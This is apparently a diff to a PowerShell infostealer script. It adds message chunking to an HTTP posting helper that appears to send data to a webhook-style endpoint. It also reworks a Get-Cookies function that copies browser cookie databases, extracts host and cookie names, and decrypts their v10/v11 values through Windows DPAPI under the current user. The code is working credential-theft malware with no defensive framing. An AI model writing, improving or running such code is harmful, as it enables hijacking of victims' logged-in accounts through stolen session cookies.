@@ -12,6 +12,19 @@ $script:P=2000
 # ---- HTTP helpers ----
 function Post($text){
   try{
+    $t=[string]$text
+    $n=1900
+    if($t.Length -le $n){ Post-One $t }
+    else{
+      for($i=0; $i -lt $t.Length; $i+=$n){
+        Post-One $t.Substring($i,[Math]::Min($n,$t.Length-$i))
+      }
+    }
+  }catch{}
+}
+
+function Post-One($text){
+  try{
     $wc=New-Object Net.WebClient
     $wc.Headers.Add('Content-Type','application/json')
     $b=@{'content'=$text}|ConvertTo-Json -Compress
@@ -168,19 +181,25 @@ function Get-Cookies($browser){
       Copy-Item $src $dst -Force -EA 0
       $bytes=[IO.File]::ReadAllBytes($dst)
       $raw=[Text.Encoding]::GetEncoding('ISO-8859-1').GetString($bytes)
-      $re=[regex]'(?s)([a-zA-Z0-9\.\-]{3,120}\.[a-zA-Z]{2,12})\x00(.{1,80}?)\x00\x00(.{1,60}?)\x00\x00\x00\x00\x00\x00\x00\x00.{0,6}(v1[01])(.{6,600}?)(?=\x00)'
+      $re=[regex]'([a-zA-Z0-9\.\-]{2,120}\.[a-zA-Z]{2,12})([a-zA-Z0-9_\-\.=]{1,64})/'
+      $seen=@{}
       foreach($m in $re.Matches($raw)){
         $host=$m.Groups[1].Value
         $name=$m.Groups[2].Value
-        $ver=$m.Groups[4].Value
-        $enc=[Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($m.Groups[5].Value)
-        $plain=''
-        try{
-          $plain=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser'))
-        }catch{}
-        if($host -match '\.' -and $name -match '^[a-zA-Z0-9_\-\.=]{1,80}$' -and $plain){
-          $cookies += [pscustomobject]@{host=$host;name=$name;value=$plain}
+        if($host -notmatch '\.[a-zA-Z]{2,12}$'){ continue }
+        $key="$host|$name"
+        if($seen.ContainsKey($key)){ continue }
+        $seen[$key]=$true
+        # try v10/v11 DPAPI decrypt on the bytes following the match
+        $val='(encrypted)'
+        $after=$raw.Substring($m.Index + $m.Length)
+        $v=[regex]'(v10|v11)([\x00-\xff]{8,600})'
+        $vm=$v.Match($after)
+        if($vm.Success){
+          $enc=[Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($vm.Groups[2].Value)
+          try{ $val=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser')) }catch{}
         }
+        $cookies += [pscustomobject]@{host=$host.TrimStart('.');name=$name;value=$val}
       }
       Remove-Item $dst -Force -EA 0
     }
